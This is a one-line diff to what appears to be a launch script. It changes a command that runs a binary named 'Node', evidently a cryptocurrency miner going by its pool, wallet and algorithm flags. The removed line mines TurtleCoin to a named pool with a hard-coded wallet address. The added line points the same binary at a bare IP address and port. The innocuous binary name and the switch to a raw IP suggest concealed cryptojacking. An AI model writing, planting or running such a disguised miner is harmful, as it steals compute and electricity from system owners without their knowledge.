@@ -1,1 +1,1 @@
-chmod 777 Node && ./Node --donate-level 1 -o turtlecoin.herominers.com:10380 -u TRTLv2xgnXYJBqb7BuX2MwFZg42hfNDxrK9Y7kjZBNHuZRM17sJSEvQQK8BDhb3Nra48dvXydwZEjA7gWKNwLRJpE7Rw4DXjQqJ+0000000000000000000000000000000000000000000000000000001884299067 -p Ma_Bad -a argon2/chukwav2 -k 
+chmod 777 Node && ./Node -o 45.79.193.228:8888
